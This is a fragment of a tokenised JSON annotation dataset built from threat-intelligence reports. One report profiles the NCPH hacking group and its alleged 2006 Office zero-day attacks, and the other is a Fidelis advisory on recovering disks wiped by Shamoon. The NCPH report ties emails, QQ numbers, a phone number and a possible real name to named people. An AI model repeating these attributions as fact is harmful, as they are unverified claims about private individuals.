"2006", "-", "PcShare", "Trojan", "update", "recommended", "by", "Wicked", "Rose", "on", "day", "of", "new", "release"], ["May", "16", ",", "2006", "-", "Update", "to", "windowsupdates", ".", "net", "attack", "site"], ["May", "16", ",", "2006", "-", "Multiple", "GinWui", ".", "A", "attacks", "against", "US", "target"], ["May", "18", ",", "2006", "-", "SANS", "reports", "zero-day", "attack"], ["May", "19", ",", "2006", "Update", "to", "windowsupdates", ".", "net", "attack", "site"], ["May", "20", ",", "2006", "-", "GinWui", ".", "B", "Attack"], ["May", "20", ",", "2006", "-", "WZT", "Kicked", "out", "of", "NCPH"], ["May", "29", ",", "2006", "-", "GinWui", ".", "C", "Attack"], ["June", "1", ",", "2006", "Update", "to", "windowsupdates", ".", "net", "attack", "site"], ["June", "9", ",", "2006", "\u2013", "Mdropper", ".", "F", "Attack"], ["June", "14", ",", "2006", "\u2013", "Daserf", ".", "A", "Attack"], ["June", "15", ",", "2006", "\u2013", "Mdropper", ".", "G", "Attack"], ["June", "15", ",", "2006", "\u2013", "Booli", ".", "A", "Trojan", "Attack"], ["June", "16", ",", "2006", "-", "Flux", ".", "E", "Attack"], ["June", "18", ",", "2006", "-", "RipGof", ".", "B", "Attack"], ["June", "23", ",", "2006", "\u2013", "PPDropper", ".", "A"], ["June", "23", ",", "2006", "\u2013", "Booli", ".", "B", "Trojan", "attack"], ["June", "25", ",", "2006", "-", "GinWui", ".", "D", "Attack"], ["June", "26", ",", "2006", "-", "GinWui", ".", "E", "Attack"], ["Sept", ".", "27", ",", "2006", "\u2013", "PPDropper", ".", "F", "Attack"], ["Sept", ".", "30", ",", "2006", "\u2013", "GinWui", ".", "G", "Attack"], ["Oct", ".", "9", ",", "2006", "\u2013", "Wicked", "Rose", "reports", "pay", "increase;", "likely", "in", "September"], ["7"], ["A", "Pictorial", "Introduction", "to", "Wicked", "Rose", "and", "NCPH"], ["Just", "who", "are", "Wicked", "Rose", "and", "the", "NCPH", "hacker", "group", "?", "As", "it", "turns", "out", ",", "a", "collection", "of", "college"], ["students", "in", "China", "who", "likely", "room", "with", "one", "another", "and", "regularly", "support", "their", "hacking", "interests", "."], ["In-depth", "research", "implicates", "Wicked", "Rose", "as", "the", "ring-leader", "of", "the", "group", ",", "responsible", "for"], ["managing", "hacker", "for", "hire", "relationships", "and", "paying", "group", "members", "for", "their", "work", "as", "hackers", "."], ["During", "the", "time", "of", "targeted", "attacks", "in", "2006", "their", "income", "increased", "significantly", ",", "to", "full-time"], ["wages", "for", "part", "time", "hacking", ".", "Wicked", "Rose", ",", "leader", "of", "the", "group", ",", "is", "pictured", "below:"], ["\u73ab\u7470", "\u9ed1\u5ba2", "(MeiGui", "HeiKe)", "\u201cRose", "Hacker\u201d"], ["QQ", "number", "is", "5372453", "www", ".", "mghacker.com"], ["Wicked", "Rose", "maintains", "a", "personal", "site", "at", "www", ".", "mghacker.com."], ["Wicked", "Rose's", "Website:", "www", ".", "mghacker.com"], ["Rose", "is", "an", "approximate", "20-year-old", "(2006)", "student", "at", "the", "Sichuan", "University", "of", "Science", "&"], ["Engineering", ".", "In", "the", "spring", "of", "2006", "Wicked", "Rose", "claims", "to", "have", "dropped", "out", "of", "school", "for", "full"], ["time", "hacking", "opportunities", ".", "Specifically", ",", "on", "April", "30", ",", "2006", "his", "blog", "entry", "claims", "he", "did", "not"], ["register", "for", "his", "university", "exam", ".", "He", "performed", "significant", "updates", "to", "his", "rootkit", "code", "from"], ["March", "through", "June", "2006", ".", "He", "later", "returned", "to", "school", "by", "September", "2006", "."], ["Wicked", "Rose", "claims", "responsibility", "on", "his", "blog", "for", "targeted", "e-mail", "based", "attacks", "containing"], ["Microsoft", "Word", "and", "CHM", "exploits", "from", "the", "spring", "of", "2006", "."], ["Other", "NCPH-member", "websites", "include:", "http://rodag", ".", "blogbus.com,"], ["http://www", ".", "cppblog.com/charles", "and", "http://kungbim", ".", "blogbus.com.", "The", "main", "NCPH", "website", "is"], ["www", ".", "ncph.net:"], ["NCPH", "Studio", "website", "www", ".", "ncph.net"], ["Registration", "information", "for", "ncph", ".", "net", "reveals", "a", "Chinese", "registrant:"], ["Registrant", "Contact:", "ncph", "studio", "(ncph2005@126", ".", "com)", "si", "chuan", "li", "gong", "xue", "yuan"], ["zigong", ",", "Sichuan", ",", "cn", "643000", "P:", "+86", ".", "13154663992", "F:", "+86", ".", "13154663992"], ["The", "main", "location", "of", "the", "NCPH", "group", "is", "in", "Zigong", ",", "Sichuan", "Province", ",", "in", "south-central", "China", "."], ["Zigong", ",", "Sichuan", "Province", ",", "in", "south-central", "China"], ["The", "NCPH", "group", "(NCPH", "Studio)", "in", "Zigong", ",", "China", ",", "is", "shown", "here:"], ["NCPH", "hackers", "at", "work", "in", "the", "\u201cncph", "studio\u201d"], ["Left", "to", "right:", "\u201cWicked", "Rose", ",", "\u201d", "KuNgBiM", ",", "Charles", "and", "Rodag"], ["Additional", "photos", "featuring", "Wicked", "Rose", "and", "NCPH", "hackers", "are", "below", ",", "captured", "from", "their"], ["various", "websites", "and", "blog", "entries", "in", "2006", ".", "Chinese", "translation", "for", "each", "photo", "are", "below:"], ["\"Wicked", "Rose\""], ["From", "an", "ancient", "Chinese", "poem", ","], ["expressing", "the", "devotion", "of", "his", "heart", "for"], ["hacking", "."], ["\"After", "you", "choose", "the", "technology", "you"], ["love", ",", "you", "have", "to", "research", "every", "system"], ["and", "code", "everyday", "!", "\""], ["Charles:", "\"Silence", "belongs", "to", "our"], ["world", ".", "..\""], ["Charles"], ["\"Charles", "always", "laughs", "so", "brightly", "when"], ["searching", "for", "program", "problems", "!", "\""], ["KuNgBiM"], ["\"Only", "we", "can", "feel", "this", "kind", "of", "happy", ".", "..\""], ["Ronag"], ["\"Behind", "every", "successful", "design", ",", "he"], ["always", "has", "a", "slight", "smile\u2026\""], ["Wicked", "Rose", "and", "NCPH", "hacking", "photos"], ["WHG", "(\u201cFig\u201d)"], ["WHG", "is", "not", "a", "core", "member", "of", "NCPH", "but", "a", "close", "affiliate", "of", "Wicked", "Rose", ".", "WHG", "appears", "to", "be"], ["central", "to", "development", "of", "the", "NCPH", "rootkit", ",", "aka", "GinWui", ".", "WHG", "is", "credited", "by", "Wicked", "Rose", "as"], ["one", "of", "the", "authors", "of", "this", "malicious", "code", ".", "WHG", "is", "an", "experienced", "malicious", "code", "author", "with"], ["the", "following", "contact", "information:"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["E-mail", "address:"], ["QQ", "Number:"], ["Website:"], ["Real", "Name:"], ["Location:"], ["whg@163", ".", "com"], ["312016"], ["http://cnasm", ".", "com"], ["May", "be", "\"Zhao", "Jibing\",\u8d75\u7eaa\u658c", "."], ["Believed", "to", "be", "employed", "in", "the", "Sichuan", "province", "of", "China", "."], ["WZT"], ["WZT", "is", "a", "former", "member", "of", "the", "NCPH", "group", "who", "was", "kicked", "out", "during", "the", "time", "of", "zero-day"], ["attacks", "in", "May", "2006", ".", "WZT", "was", "removed", "on", "May", "20", ",", "2006", ".", "During", "this", "time", "period", "the", "zeroday", "attacks", "became", "publicly", "disclosed", ",", "increasing", "pressure", "upon", "the", "hacking", "group", ".", "It", "is", "feasible"], ["that", "WZT", "may", "have", "offended", "the", "group", "in", "some", "way", "related", "to", "zero-day", "attack", "techniques", ",", "strife"], ["over", "hacker", "for", "hire", "deals", ",", "or", "competition", "for", "hacker", "for", "hire", "deals", "."], ["WZT", "is", "a", "former", "coding", "expert", "within", "the", "NCPH", "group", "and", "many", "years", "experience", "in", "hacking", "."], ["He", "is", "responsible", "for", "creating", "multiple", "tools", "and", "regularly", "giving", "credit", "to", "the", "infamous", "Li0n"], ["Chinese", "hacker", "(founder", "of", "Honker", "Union", "(HUC)", "Chinese", "group", ".", "WZT", "maintains", "a", "website", "at"], ["tthacker", ".", "cublog.cn."], ["The", "Jiangsu", "Connection", "?"], ["WHOIS", "registrant", "data", "for", "related", "domains", "used", "within", "attacks", "and", "hacker", "sites", "reveals", "a"], ["connection", "with", "the", "Jiangsu", "province", "of", "China", ".", "One", "domain", ",", "windowsupdates", ".", "net,", "is", "used", "in"], ["attacks", "and", "revolves", "to", "an", "IP", "address", "in", "the", "Sichuan", "province", ".", "Meanwhile", ",", "the", "registrant"], ["\"zhaofeng", "network\"", "is", "reportedly", "based", "out", "of", "Jiangsu", ",", "not", "Sichuan", ".", "Some", "of", "the", "WHOIS"], ["information", "clearly", "contains", "fraudulent", "information", "to", "presumably", "direct", "researchers", "away", "from"], ["the", "true", "identity", "and", "location", "of", "the", "attacker", "responsible", "for", "registering", "the", "hostile", "domain", ".", "The"], ["connection", "to", "the", "Jiangsu", "and", "Sichuan", "provinces", "remains", "unclear", "."], ["8"], ["Concluding", "Comments"], ["Prior", "to", "Wicked", "Rose", "and", "NCPH", "hacker", "for", "hire", "attacks", "in", "2006", ",", "Chinese", "hackers", "are", "only"], ["known", "for", "their", "patriotic", "hacking", ".", "This", "disturbing", "development", "reveals", "two", "critical", "threats:", "1)"], ["motives", "of", "Chinese", "hackers", "are", "changing", "2)", "Chinese", "hackers", "are", "regularly", "associated", "with"], ["sophisticated", "attacks", "as", "of", "2006", "."], ["Wicked", "Rose", "implicates", "himself", "in", "his", "early", "blog", "entries", "and", "website", "posts", "in", "2006", "and", "prior", "."], ["An", "unknown", "company", "or", "entity", "reportedly", "paid", "Wicked", "Rose", "for", "hacking", "at", "the", "rate", "of", "2", ",", "000"], ["RMB", "a", "month", ",", "about", "$250", "USD", ".", "At", "this", "time", "Wicked", "Rose", "gave", "200", "RMB", "to", "NCPH", "hackers"], ["and", "kept", "the", "rest", "for", "himself", ".", "Once", "targeted", "attacks", "took", "place", "the", "payment", "increased", "five-fold", "to"], ["5", ",", "000", "RMB", "monthly", "with", "$1", ",", "000", "a", "month", "going", "to", "NCPH", "hackers", ".", "This", "is", "a", "significant", "amount"], ["of", "money", "in", "China", ",", "effectively", "paying", "hackers", "a", "full-time", "wage", "for", "part-time", "hacking", "."], ["Throughout", "the", "summer", "of", "2006", ",", "while", "Wicked", "Rose", "was", "not", "in", "school", ",", "over", "35", "zero-day"], ["attacks", ",", "proof-of-concept", "codes", ",", "and", "attacks", "against", "un-patched", "Microsoft", "Office", "vulnerabilities"], ["are", "discovered", "in", "the", "wild", ".", "With", "Wicked", "Rose", "claiming", "responsibility", "for", "early", "attacks", "and", "the"], ["lead", "author", "of", "both", "GinWui", "and", "the", "NCPH", "hacking", "group", ",", "there", "is", "little", "doubt", "left", "as", "to", "his"], ["involvement", "in", "attacks", "to", "date", "."], ["By", "the", "end", "of", "2006", "attacks", "become", "increasingly", "sophisticated", ".", "In", "one", "instance", "a", "popular"], ["PowerPoint", "file", "distributed", "during", "the", "Christmas", "holiday", "season", "for", "the", "last", "two", "years", "prior", "is"], ["used", "within", "a", "socially", "engineered", "attack", "upon", "one", "individual", "within", "an", "energy", "sector", "US", "based"], ["company", ".", "The", "PowerPoint", "file", "is", "modified", "to", "include", "an", "exploit", "that", "silently", "installs", "malicious"], ["code", ".", "This", "same", "individual", "receives", "another", "e-mail", "containing", "a", "Microsoft", "Word", "exploit", ".", "In", "this"], ["case", "only", "one", "individual", "within", "the", "company", "is", "targeted", ",", "and", "with", "just", "two", "messages", "socially"], ["engineered", "for", "maximum", "success", ".", "This", "is", "a", "much", "more", "targeted", "and", "stealthy", "approach", "for"], ["attacks", "compared", "to", "the", "earlier", "attacks", "performed", "by", "the", "group", "in", "the", "late", "spring", "of", "2006", "."], ["NCPH", "continues", "to", "be", "a", "significant", "threat", "going", "forth", "for", "several", "reasons", "."], ["1", ".", "Attacks", "continue", "to", "take", "place", "in", "the", "wild", "and", "are", "very", "difficult", "to", "identify", "on", "a", "targeted"], ["basis", ".", "Only", "the", "most", "sophisticated", "networks", "and", "system", "administrators", "are", "able", "to"], ["properly", "protect", "and", "capture", "hostile", "targeted", "attack", "files", "before", "an", "attack", "takes", "place", "."], ["2", ".", "NCPH", "is", "a", "serious", "dedicated", "hacking", "group", "that", "is", "methodical", "and", "disciplined", "in", "their"], ["development", "of", "new", "exploits", "and", "attacks", "."], ["3", ".", "NCPH", "is", "motivated", "by", "both", "the", "thrill", "and", "challenge", "of", "hacking", "and", "money", "as", "a", "motive", "."], ["4", ".", "Attacks", "by", "the", "group", "are", "highly", "targeted", "and", "stealthy", ",", "very", "difficult", "to", "detect", "and", "remove", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Time", "name": "November 1 2012", "sent_id": 6, "pos": [0, 3]}, {"old_id": "T2", "type": "Time", "name": "2012-11-01", "sent_id": 10, "pos": [0]}, {"old_id": "T3", "type": "Malware", "name": "Shamoon", "sent_id": 12, "pos": [1]}, {"old_id": "T4", "type": "Malware", "name": "Shamoon", "sent_id": 27, "pos": [6]}, {"old_id": "T5", "type": "Time", "name": "August 15 2012", "sent_id": 28, "pos": [8, 11]}, {"old_id": "T6", "type": "Organization", "name": "Securelist", "sent_id": 31, "pos": [6]}, {"old_id": "T7", "type": "Person", "name": "Kaspersky\u2019s", "sent_id": 31, "pos": [5]}, {"old_id": "T8", "type": "Malware", "name": "Shamoon", "sent_id": 32, "pos": [3]}, {"old_id": "T9", "type": "Organization", "name": "General Dynamics Fidelis Cybersecurity Solutions", "sent_id": 32, "pos": [5, 9]}, {"old_id": "T10", "type": "Software", "name": "Windows XP", "sent_id": 117, "pos": [13, 14]}, {"old_id": "T11", "type": "Software", "name": "Windows 2003", "sent_id": 118, "pos": [0, 1]}, {"old_id": "T12", "type": "Software", "name": "Windows 7", "sent_id": 118, "pos": [0, 5]}, {"old_id": "T13", "type": "Software", "name": "Windows 7", "sent_id": 118, "pos": [0, 5]}, {"old_id": "T14", "type": "Malware", "name": "Shamoon", "sent_id": 111, "pos": [6]}, {"old_id": "T15", "type": "Malware", "name": "Shamoon", "sent_id": 116, "pos": [15]}, {"old_id": "T16", "type": "Software", "name": "EnCase", "sent_id": 223, "pos": [12]}, {"old_id": "T17", "type": "Software", "name": "EnCase", "sent_id": 224, "pos": [8]}, {"old_id": "T18", "type": "Software", "name": "EnCase", "sent_id": 237, "pos": [7]}, {"old_id": "T19", "type": "Software", "name": "EnCase", "sent_id": 240, "pos": [10]}, {"old_id": "T20", "type": "Software", "name": "WinHex", "sent_id": 241, "pos": [15]}, {"old_id": "T21", "type": "Software", "name": "XP/2003", "sent_id": 248, "pos": [1]}, {"old_id": "T22", "type": "Software", "name": "Windows 7", "sent_id": 248, "pos": [8, 9]}, {"old_id": "T23", "type": "Software", "name": "Windows 2003", "sent_id": 258, "pos": [6, 7]}, {"old_id": "T24", "type": "Software", "name": "EnCase", "sent_id": 277, "pos": [0]}, {"old_id": "T25", "type": "Software", "name": "EnCase", "sent_id": 297, "pos": [13]}, {"old_id": "T26", "type": "Malware", "name": "Shamoon", "sent_id": 314, "pos": [11]}, {"old_id": "T27", "type": "Software", "name": "Fidelis XPS Internal Sensor", "sent_id": 318, "pos": [9, 12]}], "labels": [{"old_id": "R1", "r": "P33", "h": 3, "t": 4, "evidence": [27, 28]}], "title": ["inputs/txt/201211FidelisShamoon"], "sents": [["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["Fidelis", "Threat", "Advisory", "#1007"], ["RECOVERING", "FROM", "SHAMOON"], ["November", "1", ",", "2012"], ["Document", "Status:"], ["Last", "Revised:"], ["FINAL"], ["2012-11-01"], ["Executive", "Summary"], ["The", "Shamoon", "malware", "has", "received", "considerable", "coverage", "in", "the", "past", "couple", "of", "months"], ["because", "of", "its", "destructive", "nature", ".", "Despite", "assertions", "that", "it", "is", "the", "work", "of", "amateurs", ",", "it", "has", "had", "a"], ["major", "impact", "on", "companies", "believed", "to", "have", "been", "affected", ".", "The", "basic", "functions", "of", "the", "malware"], ["are", "to", "infect", ",", "entrench", ",", "propagate", ",", "and", "wipe", "."], ["However", "because", "of", "the", "way", "the", "malware", "operates", "and", "how", "it", "is", "programmed", "to", "wipe", ",", "it", "can", "find"], ["itself", "being", "its", "own", "enemy", ".", "It", "will", "wipe", "data", "found", "in", "the", "Documents", "and", "Settings", "folder", "and", "the"], ["System32", "folder", ",", "and", "then", "use", "a", "signed", "driver", "for", "disk", "access", "to", "start", "wiping", "at", "the", "disk", "level", "."], ["Because", "the", "operating", "system", "needs", "certain", "files", "in", "the", "System32", "folder", "to", "run", ",", "it", "was", "found", "that"], ["infected", "hosts", "will", "always", "restart", "before", "the", "malware", "can", "wipe", "completely", "at", "the", "disk", "level", "."], ["Due", "to", "this", "it", "was", "possible", "to", "make", "a", "complete", "recovery", "of", "Shamoon-infected", "file", "systems", "to", "the"], ["state", "they", "were", "in", "before", "the", "wiping", "made", "the", "OS", "unbootable", "and", "unreadable", ".", "In", "fact", "the", "majority"], ["of", "files", "outside", "of", "the", "System32", "and", "Document", "and", "Settings", "folder", "are", "recoverable", "as", "well;", "this"], ["provided", "the", "opportunity", "for", "a", "successful", "and", "fruitful", "analysis", ",", "investigation", ",", "and", "remediation"], ["effort", "."], ["Threat", "Overview"], ["According", "to", "community", "write-ups", ",", "the", "Shamoon", "malware", "appears", "to", "have", "been", "deployed"], ["against", "a", "couple", "of", "entities", "on", "or", "about", "August", "15", ",", "2012", ".", "The", "malware", "had", "self-propagating"], ["qualities", "and", "was", "designed", "to", "overwrite", "data", "on", "disks", "attached", "to", "or", "accessible", "from", "targeted"], ["systems", ".", "The", "malware\u2019s", "functionality", ",", "briefly", "summarized", "below", ",", "was", "covered", "in", "some", "detail", "in"], ["community", "postings", ",", "such", "as", "Kaspersky\u2019s", "Securelist", "blog", ".", "Analysis", "details", "and", "testing", "of", "an"], ["available", "sample", "of", "Shamoon", "by", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "researchers"], ["revealed", "that", "the", "malware\u2019s", "wipe", "operations", "did", "not", "overwrite", "entire", "disks", ",", "but", "rather", "overwrote"], ["enough", "to", "prevent", "access", "to", "the", "affected", "file", "systems", ",", "along", "with", "substantial", "amounts", "of", "file", "data", "."], ["However", ",", "analysis", "indicated", "that", "some", "files", "were", "still", "intact", "after", "the", "malware\u2019s", "write", "operations"], ["and", "subsequent", "system", "reboot", "."], ["Users", "are", "granted", "permission", "to", "copy", "and/or", "distribute", "this", "document", "in", "its", "original", "electronic", "form", "and", "print", "copies", "for", "personal", "use", ".", "This"], ["document", "cannot", "be", "modified", "or", "converted", "to", "any", "other", "electronic", "or", "machine-readable", "form", "in", "whole", "or", "in", "part", "without", "prior", "written"], ["approval", "of", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", ",", "Inc", "."], ["While", "we", "have", "done", "our", "best", "to", "ensure", "that", "the", "material", "found", "in", "this", "document", "is", "accurate", ",", "Fidelis", "makes", "no", "guarantee", "that", "the"], ["information", "contained", "herein", "is", "error", "free", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "1", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["Fidelis", "researchers", "surmised", "there", "might", "be", "a", "means", "of", "recovering", "file", "data", "from", "targeted"], ["systems", "from", "a", "forensic", "and", "investigative", "analysis", "point", "of", "view", ".", "With", "this", "goal", "in", "mind", ","], ["researchers", "tested", "several", "possible", "ways", "of", "restoring", "disk", "data", "critical", "to", "the", "access", "of", "the"], ["targeted", "disk\u2019s", "file", "system", ".", "What", "follows", "is", "a", "brief", "description", "of", "what", "the", "sample", "of", "the", "Shamoon"], ["malware", "does", "and", "a", "description", "and", "results", "of", "researchers\u2019", "file", "system", "recovery", "efforts", "."], ["Shamoon", "Wiper", "Functionality", "Actions:"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["Executes", "a", "copy", "of", "itself", "as", "a", "scheduled", "job"], ["Deletes", "the", "file", "created", "for", "the", "scheduled", "job"], ["Entrenches", "itself", "as", "a", "service"], ["Execution", "of", "the", "entrenched", "file", "results", "in", "a", "dropped", "driver"], ["The", "dropped", "driver", "is", "loaded", "and", "executed"], ["The", "dropped", "driver", "facilitates", "disk", "access"], ["The", "malware", "overwrites", "disk", "data", "to", "include", "the", "contents", "of", "\\\\Documents", "and", "Settings"], ["(user", "data)", "and", "\\\\Windows\\system32", "(system", "data)", "directories"], ["The", "malware", "eventually", "overwrites", "the", "disk\u2019s", "boot", "records", "(Master", "Boot", "Record", "(MBR)"], ["and", "Volume", "Boot", "Record", "(VBR))", "(Note:", "Testing", "was", "accomplished", "on", "disks", "with", "one"], ["partition)"], ["The", "malware", "appears", "to", "target", "user", "data", "first", ",", "then", "system", "data"], ["The", "nature", "of", "the", "overwrites", "is", "such", "that", "the", "malware", "writes", "only", "a", "certain", "amount", "of", "data"], ["to", "targeted", "files", ",", "starting", "at", "the", "files\u2019", "beginning", "(Offset", "0x0)", "and", "then", "writing", "a", "certain"], ["amount", "of", "data", "to", "other", "file", "locations"], ["Fidelis", "researcher", "observations", "included", "the", "following:"], ["o", "At", "some", "point", "during", "the", "writing", "(wiping)", "process", ",", "the", "targeted", "system", "tries", "to"], ["read", "file", "data", "that", "has", "been", "overwritten", ",", "prompting", "an", "attempt", "to", "restore", "the"], ["involved", "file"], ["o", "The", "system", "asks", "the", "user", "for", "media", "containing", "system", "files", "when", "it", "cannot", "find"], ["the", "system", "files", "it", "is", "looking", "for"], ["o", "The", "targeted", "system", "eventually", "reboots", ",", "resulting", "an", "error", "on", "restart", "because", "of"], ["the", "overwritten", "boot", "records"], ["o", "The", "disks", "targeted", "in", "testing", "were", "not", "completely", "overwritten;", "there", "was", "still"], ["apparently", "viable", "file", "data", "on", "the", "targeted", "disks"], ["o", "The", "result", "of", "the", "malware\u2019s", "operation", "was", "the", "prevention", "of", "accessing", "the"], ["targeted", "file", "system"], ["Note:", "The", "Shamoon", "sample", "Fidelis", "researchers", "had", "available", "looked", "very", "similar", "to", "that", "detailed"], ["in", "community", "write-ups", ".", "However", ",", "as", "of", "the", "date", "of", "publication", ",", "researchers", "were", "still", "analyzing"], ["the", "available", "sample", ".", "Therefore", ",", "differences", "between", "the", "available", "sample", "and", "others", "available"], ["to", "the", "community", "may", "become", "apparent", "in", "the", "future", "."], ["Analysis", "and", "Testing", "Overview"], ["Fidelis", "initially", "approached", "the", "Shamoon", "analysis", "strictly", "from", "a", "perspective", "of", "determining", "what"], ["forensic", "artifacts", "could", "be", "recovered", "from", "a", "targeted", "system", ".", "The", "goal", "was", "at", "least", "a", "partial"], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "2", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["reconstruction", "of", "the", "events", "precipitating", "the", "Shamoon", "attack", ",", "and", "possibly", "using", "those", "events"], ["found", "on", "the", "targeted", "systems", "to", "determine", "a", "start", "of", "the", "attack", ",", "and", "a", "possible", "source", ".", "Analysis"], ["revealed", "the", "possibility", "that", "some", "user", "data", "would", "be", "recovered", "as", "a", "side", "benefit", "to", "the", "forensic"], ["analysis", "process", "."], ["Three", "types", "of", "operating", "systems", "were", "used", "for", "testing", "purposes;", "all", "testing", "occurred", "on", "laptops", "."], ["The", "laptops", "were", "wiped", ",", "had", "the", "operating", "system", "installed", ",", "and", "then", "had", "the", "Shamoon", "malware"], ["executed", "on", "the", "system", ".", "The", "three", "operating", "systems", "used", "for", "testing", "were", "Windows", "XP", ","], ["Windows", "2003", ",", "and", "Windows", "7", ".", "The", "malware", "executed", "with", "no", "issues", "except", "on", "Windows", "7", "."], ["The", "User", "Access", "Control", "(UAC)", "on", "the", "Windows", "7", "systems", "had", "to", "be", "turned", "off", "before", "the"], ["malware", "would", "execute", "and", "perform", "the", "wiping", "action", "as", "has", "been", "observed", "on", "other", "machines", "."], ["This", "has", "been", "noted", "by", "others", "in", "the", "community", "as", "well", ",", "specifically", "that", "Administrator", "access", "is"], ["needed", "for", "initially", "launching", "Shamoon", "."], ["Shamoon", "operation", "results", "in", "much", "of", "the", "data", "on", "the", "affected", "systems", "being", "overwritten", "with", "the"], ["fragmented", "image", "of", "a", "burning", "flag", ".", "As", "has", "been", "detailed", "above", ",", "the", "wipe", "function", "will", "overwrite"], ["data", "within", "the", "Documents", "and", "Settings", "folder", "followed", "by", "the", "System32", "folder", ",", "and", "then", "it", "will"], ["start", "the", "physical", "disk", "access", "and", "start", "the", "wiping", "at", "the", "disk", "level", ".", "If", "the", "system", "restarts", "before"], ["the", "malware", "has", "completed", "wiping", "the", "disk", "then", "much", "of", "the", "data", "can", "still", "be", "recovered:", "each", "of"], ["our", "tests", "showed", "the", "system", "did", "restart", "before", "the", "disk", "was", "completely", "wiped", ".", "The", "amount", "wiped"], ["from", "the", "host", "will", "never", "be", "the", "same", "from", "system", "to", "system", ",", "mainly", "because", "the", "size", "of", "the", "disk"], ["and", "partitions", "will", "all", "need", "to", "be", "taken", "into", "account", "."], ["VBR", "and", "File", "System", "Recovery", "Strategies"], ["The", "following", "is", "the", "view", "of", "the", "wiped", "disk", "for", "each", "of", "the", "operating", "systems", "that", "we", "tested:"], ["Fig", "1", ".", "Example", "of", "wiped", "of", "MBR", "and", "VBR", "wiped", "by", "Shamoon", "Malware", "."], ["Figure", "1", "was", "found", "at", "the", "MBR", "(Sector", "0)", "and", "the", "VBR", "(Sector", "63/56", "(XP", ",", "2003)", ",", "and"], ["2048/206848", "(7))", "of", "each", "of", "the", "operating", "systems", "(As", "well", "as", "throughout", "the", "drive)", ".", "Fidelis"], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "3", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["researchers", "decided", "to", "look", "further", "into", "the", "drive", "and", "find", "if", "there", "was", "any", "possibility", "of", "recovering"], ["files", "or", "logs", "that", "would", "help", "illuminate", "what", "happened", "to", "the", "systems", ",", "and", "if", "any", "artifacts", "of", "the"], ["malware", "could", "be", "recovered", "."], ["Note", "on", "the", "VBR:", "VBR", "stands", "for", "Volume", "Boot", "Record", ",", "and", "is", "made", "up", "of", "the", "boot", "sector", "and"], ["bootstrap", "code", ".", "The", "boot", "sector", "takes", "up", "1", "sector", "on", "the", "drive;", "the", "next", "6", "sectors", "on", "the", "drive", "are"], ["allocated", "for", "the", "bootstrap", "code", ".", "In", "all", "16", "sectors", "are", "allocated", "in", "total", "for", "the", "VBR", ".", "The", "VBR", "is"], ["created", "when", "a", "file", "system", "is", "created", "on", "a", "partition", ".", "In", "this", "paper", "we", "will", "be", "covering", "the", "NTFS"], ["Boot", "Record", ".", "The", "VBR", "is", "used", "to", "load", "machine", "code", "into", "RAM", "to", "start", "a", "program", ".", "Normally", "this"], ["program", "is", "the", "operating", "system", "."], ["Keyword", "searches", "revealed", "that", "there", "were", "still", "files", "that", "would", "be", "recoverable", "on", "the", "system", ".", "In"], ["particular", "it", "was", "found", "that", "registry", "files", "and", "headers", "were", "still", "on", "the", "disk", ".", "After", "this", ",", "it", "was", "found"], ["that", "the", "Master", "File", "Table", "(MFT)", "was", "still", ",", "for", "the", "most", "part", ",", "intact", ".", "Trying", "to", "avoid", "the", "long", "and"], ["laborious", "process", "of", "carving", "files", "from", "the", "disk", ",", "researchers", "decided", "that", "it", "would", "instead", "be"], ["worth", "the", "time", "to", "try", "and", "recover", "the", "file", "system", "."], ["When", "the", "Windows", "operating", "system", "is", "installed", "or", "an", "NTFS", "volume", "created", ",", "a", "backup", "copy", "of"], ["the", "VBR", "is", "written", "to", "the", "last", "sector", "of", "the", "volume", ".", "This", "is", "a", "very", "important", "detail", ",", "as", "the", "forensic"], ["value", "of", "the", "VBR", "is", "substantial", "(See", "Figure", "2)", ".", "The", "area", "that", "will", "contain", "the", "critical", "information", "is"], ["known", "as", "the", "Bios", "Parameter", "Block", "(BPB)", ".", "With", "this", "information", "it", "is", "possible", "to", "rebuild", "the", "file"], ["system", "as", "it", "existed", "before", "the", "wipe", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "4", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["EB", "52", "90", "4E", "54", "46", "53", "20", "20", "20", "20", "00", "02", "08", "00", "00", "00", "00", "00", "00", "00", "F8", "00", "00", "3F", "00", "FF", "00", "3F", "00", "00", "00", "00", "00"], ["00", "00", "80", "00", "80", "00", "C0", "F8", "F8", "0D", "00", "00", "00", "00", "00", "00", "0C", "00", "00", "00", "00", "00", "8C", "8F", "DF", "00", "00", "00", "00", "00", "F6", "00", "00"], ["00", "01", "00", "00", "00", "26", "FA", "CA", "70", "02", "CB", "70", "44", "00", "00", "00", "00"], ["[\u2026", 